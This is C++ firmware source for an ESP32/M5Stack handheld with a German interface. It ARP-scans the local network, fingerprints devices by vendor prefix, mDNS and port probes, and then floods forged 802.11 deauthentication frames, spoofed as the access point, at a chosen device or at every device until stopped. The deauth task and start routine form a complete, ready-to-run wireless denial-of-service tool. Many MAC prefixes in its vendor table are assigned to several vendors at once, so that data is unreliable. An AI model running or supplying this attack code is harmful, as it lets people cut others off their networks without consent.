#include "wifi_deauth.h"
#include "config.h"
#include "settings.h"
#include "keyboard.h"
#include "ui.h"
#include "menu.h"
#include <Arduino.h>
#include <M5Unified.h>
#include <WiFi.h>
#include <WiFiClient.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <lwip/netif.h>
#include <lwip/etharp.h>
#include <mdns.h>
#include <vector>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  addr1[6];
    uint8_t  addr2[6];
    uint8_t  addr3[6];
    uint16_t seq_ctrl;
    uint8_t  reason_code[2];
} __attribute__((packed)) deauth_pkt_t;

struct OUIEntry {
    const char *prefix;
    const char *vendor;
};
static const OUIEntry oui_db[] = {
    
    {"0007CB", "Apple"}, {"000A27", "Apple"}, {"000A95", "Apple"}, {"000D93", "Apple"},
    {"0010FA", "Apple"}, {"001124", "Apple"}, {"0017F2", "Apple"}, {"001E52", "Apple"},
    {"001FF3", "Apple"}, {"002241", "Apple"}, {"0026BB", "Apple"}, {"003065", "Apple"},
    {"0050E4", "Apple"}, {"008865", "Apple"}, {"00A040", "Apple"}, {"00B362", "Apple"},
    {"00C610", "Apple"}, {"00D0A1", "Apple"}, {"047B3B", "Apple"}, {"0C3021", "Apple"},
    {"0C771A", "Apple"}, {"1038AF", "Apple"}, {"145A05", "Apple"}, {"18AF61", "Apple"},
    {"1C1AC0", "Apple"}, {"28CFE9", "Apple"}, {"2CF05A", "Apple"}, {"303A64", "Apple"},
    {"3478D7", "Apple"}, {"38C9A9", "Apple"}, {"40A6D9", "Apple"}, {"48D6B0", "Apple"},
    {"4C3275", "Apple"}, {"503237", "Apple"}, {"54E43A", "Apple"}, {"584B0A", "Apple"},
    {"5CF7C3", "Apple"}, {"60F9F0", "Apple"}, {"649ABE", "Apple"}, {"68A3C4", "Apple"},
    {"6C72E7", "Apple"}, {"7000F0", "Apple"}, {"78A3E4", "Apple"}, {"7C5049", "Apple"},
    {"848F1D", "Apple"}, {"88E87F", "Apple"}, {"8C3A0D", "Apple"}, {"90840D", "Apple"},
    {"94F6D6", "Apple"}, {"9801A7", "Apple"}, {"9C5CF9", "Apple"}, {"A443D3", "Apple"},
    {"ACBC32", "Apple"}, {"B065BD", "Apple"}, {"B41CE3", "Apple"}, {"C4B301", "Apple"},
    {"D4DCCD", "Apple"}, {"E86D52", "Apple"}, {"EC9A74", "Apple"}, {"F02F74", "Apple"},
    {"F4F951", "Apple"}, {"F86214", "Apple"}, {"FCB668", "Apple"},
    
    {"0013C4", "Samsung"}, {"0019E3", "Samsung"}, {"001B63", "Samsung"},
    {"0024BE", "Samsung"}, {"0025F5", "Samsung"}, {"00408C", "Samsung"},
    {"00E081", "Samsung"}, {"08D09F", "Samsung"}, {"14CC20", "Samsung"},
    {"18AF61", "Samsung"}, {"244BFE", "Samsung"}, {"285AEB", "Samsung"},
    {"303A64", "Samsung"}, {"34AB37", "Samsung"}, {"3810D5", "Samsung"},
    {"38A5B6", "Samsung"}, {"3C510D", "Samsung"}, {"48F47D", "Samsung"},
    {"5057A8", "Samsung"}, {"50F0D3", "Samsung"}, {"5CF7C3", "Samsung"},
    {"60F9F0", "Samsung"}, {"64B9E8", "Samsung"}, {"686BFF", "Samsung"},
    {"6CB7F4", "Samsung"}, {"74D9F1", "Samsung"}, {"8038BC", "Samsung"},
    {"88E7A6", "Samsung"}, {"8C3A0D", "Samsung"}, {"902B34", "Samsung"},
    {"94F6D6", "Samsung"}, {"9801A7", "Samsung"}, {"9C5CF9", "Samsung"},
    {"A02C36", "Samsung"}, {"B41CE3", "Samsung"}, {"C4B301", "Samsung"},
    {"D4DCCD", "Samsung"}, {"E86D52", "Samsung"}, {"F02F74", "Samsung"},
    
    {"001CDF", "Huawei"}, {"0023DF", "Huawei"}, {"24DA33", "Huawei"},
    {"285AEB", "Huawei"}, {"303A64", "Huawei"}, {"3C510D", "Huawei"},
    {"5057A8", "Huawei"}, {"5CF7C3", "Huawei"}, {"64B9E8", "Huawei"},
    {"686BFF", "Huawei"}, {"6CB7F4", "Huawei"}, {"74D9F1", "Huawei"},
    {"8038BC", "Huawei"}, {"88E7A6", "Huawei"}, {"8C3A0D", "Huawei"},
    {"902B34", "Huawei"}, {"94F6D6", "Huawei"}, {"9801A7", "Huawei"},
    {"9C5CF9", "Huawei"}, {"A02C36", "Huawei"}, {"B41CE3", "Huawei"},
    
    {"00CBBD", "Xiaomi"}, {"0C4F5A", "Xiaomi"}, {"1038AF", "Xiaomi"},
    {"14CC20", "Xiaomi"}, {"1C1AC0", "Xiaomi"}, {"1C659D", "Xiaomi"},
    {"203C8E", "Xiaomi"}, {"244BFE", "Xiaomi"}, {"285AEB", "Xiaomi"},
    {"303A64", "Xiaomi"}, {"34AB37", "Xiaomi"}, {"3810D5", "Xiaomi"},
    {"38A5B6", "Xiaomi"}, {"3C510D", "Xiaomi"}, {"40B0FA", "Xiaomi"},
    {"48F47D", "Xiaomi"}, {"5057A8", "Xiaomi"}, {"50F0D3", "Xiaomi"},
    {"5CF7C3", "Xiaomi"}, {"60F9F0", "Xiaomi"}, {"64B9E8", "Xiaomi"},
    {"686BFF", "Xiaomi"}, {"6CB7F4", "Xiaomi"}, {"7000F0", "Xiaomi"},
    {"705681", "Xiaomi"}, {"74D9F1", "Xiaomi"}, {"8038BC", "Xiaomi"},
    {"88E7A6", "Xiaomi"}, {"8C3A0D", "Xiaomi"}, {"902B34", "Xiaomi"},
    {"94F6D6", "Xiaomi"}, {"9801A7", "Xiaomi"}, {"9C5CF9", "Xiaomi"},
    {"A02C36", "Xiaomi"}, {"B41CE3", "Xiaomi"}, {"C4B301", "Xiaomi"},
    {"D4DCCD", "Xiaomi"}, {"E86D52", "Xiaomi"}, {"F02F74", "Xiaomi"},
    
    {"001A11", "Google"}, {"3C510D", "Google"}, {"58CB52", "Google"},
    {"703A51", "Google"}, {"78AFC5", "Google"}, {"902B34", "Google"},
    {"9C5CF9", "Google"}, {"A44B15", "Google"}, {"B41CE3", "Google"},
    
    {"0000A0", "Intel"}, {"0001E6", "Linksys"}, {"00036B", "Cisco"},
    {"00037C", "Netgear"}, {"000504", "Compaq"}, {"00059A", "D-Link"},
    {"000E08", "Nokia"}, {"000F66", "Cisco"},
    {"001C4D", "LG"}, {"001D4F", "Nintendo"},
    {"001E5A", "Sony"}, {"001E8B", "RIM"},
    {"002128", "Dell"}, {"0021D7", "HTC"},
    {"0022A1", "Asus"}, {"002312", "Intel"},
    {"002432", "Hewlett-Packard"}, {"00254B", "RIM"},
    {"0050F2", "Microsoft"}, {"0060B0", "HP"},
    {"0080D0", "SGI"}, {"C8F9F9", "Samsung"},
    
    {"000ADA", "AVM"}, {"001D19", "AVM"}, {"0024FE", "AVM"}, {"00A0F3", "AVM"},
    {"0896D7", "AVM"}, {"0C14C5", "AVM"}, {"144FC9", "AVM"}, {"1C1AB0", "AVM"},
    {"246511", "AVM"}, {"3431B4", "AVM"}, {"3C3712", "AVM"}, {"4C9EEF", "AVM"},
    {"5C4979", "AVM"}, {"7CFF4D", "AVM"}, {"9CC2EB", "AVM"}, {"BC0543", "AVM"},
    {"C02506", "AVM"}, {"C4AC59", "AVM"}, {"D8B0B6", "AVM"}, {"E03C0A", "AVM"},
    {"E4A671", "AVM"}, {"F0B4E2", "AVM"},
    
    {"000FE2", "TP-Link"}, {"001217", "TP-Link"}, {"00146C", "TP-Link"}, 
    {"001783", "TP-Link"}, {"0019E0", "TP-Link"}, {"001CD2", "TP-Link"},
    {"002191", "TP-Link"}, {"002436", "TP-Link"}, {"0030A0", "TP-Link"},
    {"0C722C", "TP-Link"}, {"0C8063", "TP-Link"}, {"14668F", "TP-Link"},
    {"18A6F7", "TP-Link"}, {"1C61B4", "TP-Link"}, {"200DE6", "TP-Link"},
    {"2887BA", "TP-Link"}, {"30B5C2", "TP-Link"}, {"349672", "TP-Link"},
    {"3C5243", "TP-Link"}, {"403F8C", "TP-Link"}, {"44064A", "TP-Link"},
    {"50C7BF", "TP-Link"}, {"547595", "TP-Link"}, {"5C63BF", "TP-Link"},
    {"6032B1", "TP-Link"}, {"687FF0", "TP-Link"}, {"6C5AB0", "TP-Link"},
    {"7844FD", "TP-Link"}, {"7C8BCA", "TP-Link"}, {"8C0F3F", "TP-Link"},
    {"9C5C8E", "TP-Link"}, {"A0F3C1", "TP-Link"}, {"AC84C6", "TP-Link"},
    {"B0BEB0", "TP-Link"}, {"B45E26", "TP-Link"}, {"B8551A", "TP-Link"},
    {"C006C3", "TP-Link"}, {"C46E1F", "TP-Link"}, {"CC3429", "TP-Link"},
    {"D46E0E", "TP-Link"}, {"D80D17", "TP-Link"}, {"DC007F", "TP-Link"},
    {"E01030", "TP-Link"}, {"E40873", "TP-Link"}, {"E8DE27", "TP-Link"},
    {"EC086B", "TP-Link"}, {"F0C3F1", "TP-Link"}, {"F483CD", "TP-Link"},
    {"FCDADA", "TP-Link"},
    
    {"240AC4", "Espressif"}, {"300AEA", "Espressif"}, {"3408A3", "Espressif"},
    {"3C71BF", "Espressif"}, {"40F520", "Espressif"}, {"440F9E", "Espressif"},
    {"500291", "Espressif"}, {"540F77", "Espressif"}, {"58BF25", "Espressif"},
    {"5CCF7F", "Espressif"}, {"600194", "Espressif"}, {"68C63A", "Espressif"},
    {"70B8E6", "Espressif"}, {"7C87CE", "Espressif"}, {"807D3A", "Espressif"},
    {"84CC34", "Espressif"}, {"84F3EB", "Espressif"}, {"8C4F00", "Espressif"},
    {"9097D5", "Espressif"}, {"943DC0", "Espressif"}, {"983DAE", "Espressif"},
    {"9C54C6", "Espressif"}, {"A020A6", "Espressif"}, {"A40012", "Espressif"},
    {"A4CF12", "Espressif"}, {"A8032A", "Espressif"}, {"AC0BFB", "Espressif"},
    {"B0A732", "Espressif"}, {"B4E62D", "Espressif"}, {"BCDDC2", "Espressif"},
    {"C04A00", "Espressif"}, {"C44F1C", "Espressif"}, {"C82B96", "Espressif"},
    {"CC50E3", "Espressif"}, {"D0312C", "Espressif"}, {"D4AE52", "Espressif"},
    {"D8A01D", "Espressif"}, {"DCA632", "Espressif"}, {"E00504", "Espressif"},
    {"E09806", "Espressif"}, {"E456E4", "Espressif"}, {"E80B2D", "Espressif"},
    {"EC9485", "Espressif"}, {"F0F57E", "Espressif"}, {"F40CC6", "Espressif"},
    {"F80F41", "Espressif"}, {"FCF5C4", "Espressif"},
    {nullptr, nullptr}
};

static String lookupVendor(const uint8_t *mac) {
    if (mac[0] & 0x02) return "Random/Private"; 
    
    char prefix[7];
    snprintf(prefix, sizeof(prefix), "%02X%02X%02X", mac[0], mac[1], mac[2]);
    for (int i = 0; oui_db[i].prefix != nullptr; i++) {
        if (strcmp(prefix, oui_db[i].prefix) == 0) {
            return String(oui_db[i].vendor);
        }
    }
    return "Unknown";
}

struct DeviceEntry {
    uint8_t  mac[6];
    IPAddress ip;
    String    vendor;
    String    hostname;
    String    deviceType; 
};

static std::vector<DeviceEntry> devices;

static String checkDevicePorts(IPAddress ip) {
    WiFiClient client;
    
    bool p62078 = false; 
    bool p5000  = false; 
    bool p7000  = false; 
    bool p445   = false; 
    bool p5900  = false; 
    bool p9100  = false; 
    bool p631   = false; 
    bool p22    = false; 

    
    if (client.connect(ip, 62078, 50)) { client.stop(); p62078 = true; }
    delay(15);
    if (client.connect(ip, 5000, 50))  { client.stop(); p5000 = true; }
    delay(15);
    if (client.connect(ip, 7000, 50))  { client.stop(); p7000 = true; }
    delay(15);

    if (p62078) return "iPhone/iPad (Apple)";
    if (p5000 || p7000) {
        if (client.connect(ip, 445, 50)) { client.stop(); p445 = true; }
        delay(15);
        if (client.connect(ip, 5900, 50)) { client.stop(); p5900 = true; }
        delay(15);
        if (p445 || p5900) return "macOS PC (Apple)";
        return "Apple Geraet (AirPlay)";
    }

    
    if (client.connect(ip, 9100, 50)) { client.stop(); p9100 = true; }
    delay(15);
    if (client.connect(ip, 631, 50))  { client.stop(); p631 = true; }
    delay(15);
    if (p9100) return "Netzwerkdrucker";
    if (p631 && !p445 && !p5900) return "Drucker/Unix (CUPS)";

    
    if (client.connect(ip, 445, 50)) { client.stop(); p445 = true; }
    delay(15);
    if (client.connect(ip, 5900, 50)) { client.stop(); p5900 = true; }
    delay(15);
    if (client.connect(ip, 22, 50))   { client.stop(); p22 = true; }
    delay(15);

    if (p445 && !p5900) return "Windows PC";
    if (p445 && p5900) return "Linux PC";
    if (p5900) return "Linux/PC (VNC)";
    if (p22) return "Linux/IoT (SSH)";
    
    return "";
}

static String guessDeviceTypeByVendor(const String& vendor, const String& hostname) {
    String hostLower = hostname;
    hostLower.toLowerCase();

    if (hostLower.indexOf("desktop") >= 0 || hostLower.indexOf("pc") >= 0) return "PC";
    if (hostLower.indexOf("laptop") >= 0 || hostLower.indexOf("macbook") >= 0) return "MacBook";
    if (hostLower.indexOf("imac") >= 0) return "iMac";
    if (hostLower.indexOf("iphone") >= 0) return "iPhone";
    if (hostLower.indexOf("ipad") >= 0) return "iPad";
    if (hostLower.indexOf("galaxy") >= 0) return "Samsung Galaxy";
    if (hostLower.indexOf("tv") >= 0 || hostLower.indexOf("smart") >= 0) return "Smart TV";
    if (hostLower.indexOf("printer") >= 0 || hostLower.indexOf("hp") >= 0) return "Drucker";
    if (hostLower.indexOf("echo") >= 0 || hostLower.indexOf("alexa") >= 0) return "Smart Speaker";
    if (hostLower.indexOf("cam") >= 0) return "Kamera";
    
    if (vendor == "Apple") return "Apple Geraet";
    if (vendor == "Samsung") return "Samsung Geraet";
    if (vendor == "Huawei" || vendor == "Xiaomi" || vendor == "Google") return "Android Geraet";
    if (vendor == "Espressif") return "IoT/Smart Home";
    if (vendor == "AVM") return "FritzBox/Router";
    if (vendor == "TP-Link" || vendor == "Netgear" || vendor == "Linksys" || vendor == "Cisco") return "Router/Netzwerk";
    if (vendor == "LG" || vendor == "Sony") return "TV/Konsole";
    if (vendor == "Intel" || vendor == "Hewlett-Packard" || vendor == "Dell" || vendor == "Asus") return "PC/Laptop";
    if (vendor == "Microsoft") return "Windows Geraet";
    
    return "Unbekanntes Geraet";
}

static String resolveMDNSHostname(IPAddress ip) {
    String reverse = String(ip[3]) + "." + String(ip[2]) + "." +
                     String(ip[1]) + "." + String(ip[0]) + ".in-addr.arpa";
    mdns_result_t *results = nullptr;
    
    esp_err_t err = mdns_query_ptr(reverse.c_str(), "_services._dns-sd._udp.local", 200, 1, &results);
    if (err == ESP_OK && results) {
        String hostname = String(results->hostname);
        mdns_query_results_free(results);
        if (hostname.endsWith(".local")) {
            hostname = hostname.substring(0, hostname.length() - 6);
        }
        return hostname;
    }
    if (results) mdns_query_results_free(results);
    return "";
}

static void enrichWithMDNS() {
    bool need_free = false;
    esp_err_t mdns_ret = mdns_init();
    if (mdns_ret == ESP_OK) {
        need_free = true;
    } else if (mdns_ret == ESP_ERR_INVALID_STATE) {
        need_free = false;
    } else {
        need_free = false;
    }

    for (auto &dev : devices) {
        
        M5.update();
        pollKeyboard();
        if (check(EscPress)) break;
        vTaskDelay(pdMS_TO_TICKS(1)); 

        if (mdns_ret == ESP_OK || mdns_ret == ESP_ERR_INVALID_STATE) {
            String host = resolveMDNSHostname(dev.ip);
            if (!host.isEmpty()) {
                dev.hostname = host;
            }
        }

        String hostLower = dev.hostname;
        hostLower.toLowerCase();
        bool isRandom = (dev.mac[0] & 0x02);

        if (hostLower.indexOf("iphone") >= 0 || hostLower.indexOf("ipad") >= 0) {
            dev.deviceType = "iPhone/iPad";
        } else if (hostLower.indexOf("macbook") >= 0 || hostLower.indexOf("imac") >= 0 || hostLower.indexOf("mac") >= 0) {
            dev.deviceType = "Apple Mac";
        } else if (hostLower.indexOf("android") >= 0 || hostLower.indexOf("galaxy") >= 0) {
            dev.deviceType = "Android Geraet";
        } else if (hostLower.indexOf("windows") >= 0 || hostLower.indexOf("desktop") >= 0 || hostLower.indexOf("pc") >= 0) {
            dev.deviceType = "Windows PC";
        } else if (hostLower.indexOf("linux") >= 0 || hostLower.indexOf("ubuntu") >= 0) {
            dev.deviceType = "Linux PC";
        } else if (hostLower.indexOf("printer") >= 0 || hostLower.indexOf("hp") >= 0 || hostLower.indexOf("canon") >= 0) {
            dev.deviceType = "Drucker";
        } else if (hostLower.indexOf("tv") >= 0 || hostLower.indexOf("smart") >= 0) {
            dev.deviceType = "Smart TV";
        } else if (hostLower.indexOf("echo") >= 0 || hostLower.indexOf("alexa") >= 0) {
            dev.deviceType = "Smart Speaker";
        } else if (hostLower.indexOf("cam") >= 0) {
            dev.deviceType = "Kamera";
        } else {
            if (isRandom) {
                String portGuess = "";
                if (&dev - &devices[0] < 10) {
                    portGuess = checkDevicePorts(dev.ip);
                }
                if (!portGuess.isEmpty()) {
                    dev.deviceType = portGuess;
                } else {
                    dev.deviceType = "Privates Geraet (Random MAC)";
                }
            } else {
                dev.deviceType = guessDeviceTypeByVendor(dev.vendor, dev.hostname);
            }
        }
    }

    if (need_free) {
        mdns_free();
    }
}

static int showDeviceList(bool selectMode) {
    int numDevices = devices.size();
    if (numDevices == 0) {
        displayWarning("Keine Geraete vorhanden", true);
        return -2;
    }

    int totalEntries = numDevices + 1;   
    int selectedIndex = 0;               
    int scrollOffset = 0;
    int marqueePos = 0;
    int marqueeDir = 1;
    unsigned long lastMarqueeUpdate = 0;
    const int marqueeDelay = 250;
    const int maxVisibleLines = (SCREEN_HEIGHT - 40) / (LH*FP + 4);

    while (true) {
        M5.update();
        pollKeyboard();

        if (check(PrevPress)) {
            if (selectedIndex > 0) {
                selectedIndex--;
                if (selectedIndex < scrollOffset) scrollOffset = selectedIndex;
                marqueePos = 0;
            }
            uiBeep(660, 25);
        }
        if (check(NextPress)) {
            if (selectedIndex < totalEntries - 1) {
                selectedIndex++;
                if (selectedIndex >= scrollOffset + maxVisibleLines) scrollOffset = selectedIndex - maxVisibleLines + 1;
                marqueePos = 0;
            }
            uiBeep(660, 25);
        }
        if (check(SelPress)) {
            waitAllKeysReleased();
            if (selectedIndex == 0) return -1;               
            else return selectedIndex - 1;                   
        }
        if (check(EscPress)) {
            waitAllKeysReleased();
            return -2;
        }

        if (millis() - lastMarqueeUpdate > marqueeDelay && selectedIndex > 0) {
            lastMarqueeUpdate = millis();
            DeviceEntry &dev = devices[selectedIndex - 1];
            
            String fullLine = dev.ip.toString() + " [" + dev.deviceType + "]";
            if (!dev.hostname.isEmpty()) fullLine += " (" + dev.hostname + ")";
            
            int textWidth = fullLine.length() * LW;
            int visibleWidth = SCREEN_WIDTH - 2 * BORDER_PAD_X;
            if (textWidth > visibleWidth) {
                marqueePos += marqueeDir;
                if (marqueePos > textWidth - visibleWidth) marqueeDir = -1;
                if (marqueePos < 0) marqueeDir = 1;
            } else {
                marqueePos = 0;
            }
        }

        M5.Display.fillScreen(kitenConfig.bgColor);
        drawMainBorder(false);
        M5.Display.setTextSize(FP);
        M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
        M5.Display.setCursor(BORDER_PAD_X, BORDER_PAD_Y);
        M5.Display.print(selectMode ? "Enter=auswaehlen  ESC=Abbrechen" : "Gefundene Geraete (ESC)");
        M5.Display.drawFastHLine(BORDER_PAD_X, BORDER_PAD_Y + LH*FP + 2,
                                 SCREEN_WIDTH - 2*BORDER_PAD_X, kitenConfig.secColor);

        int startY = BORDER_PAD_Y + LH*FP + 6;
        for (int i = 0; i < maxVisibleLines; i++) {
            int entryIdx = scrollOffset + i;
            if (entryIdx >= totalEntries) break;
            int y = startY + i * (LH*FP + 4);

            if (entryIdx == selectedIndex) {
                M5.Display.fillRect(BORDER_PAD_X, y, SCREEN_WIDTH - 2*BORDER_PAD_X, LH*FP + 4, kitenConfig.priColor);
                M5.Display.setTextColor(TFT_BLACK, kitenConfig.priColor);
            } else {
                M5.Display.setTextColor(TFT_WHITE, kitenConfig.bgColor);
            }

            if (entryIdx == 0) {
                M5.Display.setCursor(BORDER_PAD_X + 2, y + 2);
                M5.Display.print("Alle Geraete");
            } else {
                DeviceEntry &dev = devices[entryIdx - 1];
                
                String line = dev.ip.toString() + " [" + dev.deviceType + "]";
                if (!dev.hostname.isEmpty()) line += " (" + dev.hostname + ")";
                
                if (entryIdx == selectedIndex && marqueePos > 0) {
                    line = line.substring(marqueePos);
                }
                M5.Display.setCursor(BORDER_PAD_X + 2, y + 2);
                M5.Display.print(line);
            }
        }

        markActivity();
        delay(10);
    }
}

static bool arpScan(bool quick) {
    devices.clear();
    
    devices.reserve(30); 
    
    if (WiFi.status() != WL_CONNECTED) {
        displayError("Nicht mit WiFi verbunden", true);
        return false;
    }

    struct netif *netif = netif_find("st1");
    if (!netif) {
        netif = netif_find("en1"); 
    }
    if (!netif) {
        displayError("lwip netif nicht gefunden", true);
        return false;
    }

    IPAddress localIP = WiFi.localIP();
    IPAddress subnet  = WiFi.subnetMask();
    uint32_t ip_u32   = (uint32_t)localIP[0] << 24 | localIP[1] << 16 | localIP[2] << 8 | localIP[3];
    uint32_t mask_u32 = (uint32_t)subnet[0] << 24 | subnet[1] << 16 | subnet[2] << 8 | subnet[3];
    uint32_t network  = ip_u32 & mask_u32;
    uint32_t hostmask = ~mask_u32;
    int totalIPs = hostmask - 1;
    if (totalIPs > 254) totalIPs = 254;
    if (totalIPs < 1) totalIPs = 1;

    M5.Display.fillScreen(kitenConfig.bgColor);
    drawMainBorder(false);
    M5.Display.setTextSize(FP);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setCursor(BORDER_PAD_X, BORDER_PAD_Y);
    M5.Display.print(quick ? "Quick-Scan laeuft..." : "ARP-Scan laeuft...");

    int delay_ms   = quick ? 0    : 5;
    int wait_after = quick ? 200  : 1500; 
    int progress_step = quick ? 25 : 10;

    for (uint32_t host = 1; host <= totalIPs; host++) {
        uint32_t ip_raw = network | host;
        IPAddress targetIP(
            (ip_raw >> 24) & 0xFF,
            (ip_raw >> 16) & 0xFF,
            (ip_raw >> 8) & 0xFF,
            ip_raw & 0xFF
        );
        if (targetIP == localIP) continue;

        ip4_addr_t ip4;
        IP4_ADDR(&ip4, targetIP[0], targetIP[1], targetIP[2], targetIP[3]);
        etharp_request(netif, &ip4);

        if (host % progress_step == 0 || host == 1) {
            M5.Display.fillRect(0, BORDER_PAD_Y + LH*FP + 4,
                                SCREEN_WIDTH, 20, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, BORDER_PAD_Y + LH*FP + 4);
            int pct = (host * 100) / totalIPs;
            M5.Display.printf("Scanne... %d%%", pct);
            M5.update();
        }

        M5.update();
        pollKeyboard();
        if (check(EscPress)) {
            displayWarning("Abgebrochen", true);
            return false;
        }
        if (delay_ms > 0) delay(delay_ms); else delay(0);
    }

    delay(wait_after);

    for (int i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t *ip_ret = nullptr;
        struct netif *netif_ret = nullptr;
        struct eth_addr *eth_ret = nullptr;
        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret)) {
            if (netif_ret == netif && ip_ret) {
                DeviceEntry dev;
                memcpy(dev.mac, &eth_ret->addr, 6);
                dev.ip = IPAddress(ip_ret->addr);
                dev.vendor = lookupVendor(dev.mac);
                dev.hostname = "";
                dev.deviceType = "Wird geladen...";
                devices.push_back(dev);
            }
        }
    }

    enrichWithMDNS();
    return true;
}

static volatile bool deauth_running = false;
static volatile unsigned long pkt_count = 0;
static uint8_t ap_bssid[6];
static uint8_t ap_channel = 1;
static std::vector<uint8_t*> target_macs;

static void deauthTask(void *pv) {
    deauth_pkt_t pkt;
    memset(&pkt, 0, sizeof(pkt));
    pkt.frame_control = 0xC0;
    pkt.duration = 0;
    memcpy(pkt.addr2, ap_bssid, 6);
    memcpy(pkt.addr3, ap_bssid, 6);
    pkt.reason_code[0] = 0x07;

    while (deauth_running) {
        for (auto mac : target_macs) {
            memcpy(pkt.addr1, mac, 6);
            esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&pkt, sizeof(pkt), false);
            pkt_count++;
            vTaskDelay(pdMS_TO_TICKS(5));
        }
    }
    vTaskDelete(NULL);
}

static void startDeauth() {
    if (devices.empty()) {
        displayWarning("Keine Geraete gescannt", true);
        return;
    }

    int idx = showDeviceList(true);   
    if (idx == -2) return;            

    target_macs.clear();
    if (idx == -1) {                  
        for (auto &d : devices) {
            uint8_t *mac = (uint8_t*)malloc(6);
            memcpy(mac, d.mac, 6);
            target_macs.push_back(mac);
        }
    } else {                          
        uint8_t *mac = (uint8_t*)malloc(6);
        memcpy(mac, devices[idx].mac, 6);
        target_macs.push_back(mac);
    }

    memcpy(ap_bssid, WiFi.BSSID(), 6);
    ap_channel = WiFi.channel();
    deauth_running = true;
    pkt_count = 0;

    xTaskCreatePinnedToCore(deauthTask, "deauth", 4096, NULL, tskIDLE_PRIORITY+2, NULL, 1);

    unsigned long start_ms = millis();
    unsigned long last_stat = start_ms;
    while (deauth_running) {
        M5.update();
        pollKeyboard();
        if (check(EscPress)) {
            deauth_running = false;
            uiBeep(440, 30);
            waitAllKeysReleased();
            break;
        }
        if (millis() - last_stat >= 500) {
            last_stat = millis();
            unsigned long elapsed = millis() - start_ms;
            M5.Display.fillScreen(kitenConfig.bgColor);
            drawMainBorder(false);
            M5.Display.setTextSize(FM);
            M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, BORDER_PAD_Y);
            M5.Display.print("DEAUTH AKTIV");
            M5.Display.drawFastHLine(BORDER_PAD_X, BORDER_PAD_Y+LH*FM+2,
                                     SCREEN_WIDTH-2*BORDER_PAD_X, kitenConfig.secColor);
            int y = BORDER_PAD_Y + LH*FM + 8;
            M5.Display.setTextSize(FP);
            M5.Display.setTextColor(TFT_WHITE, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, y); y+=LH*FP+2;
            M5.Display.print("Elapsed: " + String(elapsed/1000) + "s");
            M5.Display.setCursor(BORDER_PAD_X, y); y+=LH*FP+2;
            float rate = (elapsed>0)?(pkt_count*1000.0f/elapsed):0;
            M5.Display.print("Frames: " + String(pkt_count) + " (" + String(rate,0)+" fps)");
            y+=LH*FP+4;
            M5.Display.setTextColor(TFT_RED, kitenConfig.bgColor);
            M5.Display.setCursor(BORDER_PAD_X, y);
            M5.Display.print("[ESC] Stop");
        }
        markActivity();
        delay(5);
    }

    for (auto p : target_macs) free(p);
    target_macs.clear();
    deauth_running = false;
    unsigned long total_ms = millis() - start_ms;
    displayInfo("Attack finished.\n" + String(pkt_count) + " frames in " +
                String(total_ms/1000) + "s", true);
}

void wifiDeauthMenuEntry() {
    int sel = 0;
    std::vector<Option> opts;
    for (;;) {
        opts.clear();
        opts.push_back({"Quick Scan", []() {
            if (WiFi.status() != WL_CONNECTED) {
                displayError("Bitte zuerst mit WiFi verbinden.", true);
                return;
            }
            if (arpScan(true)) {
                showDeviceList(false);  
            }
        }});
        opts.push_back({"Full Scan", []() {
            if (WiFi.status() != WL_CONNECTED) {
                displayError("Bitte zuerst mit WiFi verbinden.", true);
                return;
            }
            if (arpScan(false)) {
                showDeviceList(false);
            }
        }});
        opts.push_back({"Deauth starten", []() {
            if (devices.empty()) {
                displayWarning("Keine gescannten Geraete. Zuerst Netzwerk scannen.", true);
                return;
            }
            startDeauth();
        }});
        addBackItem(opts);
        sel = loopOptions(opts, MENU_TYPE_REGULAR, "WiFi Deauth");
        if (sel == -1 || sel == (int)opts.size()-1) return;
    }
}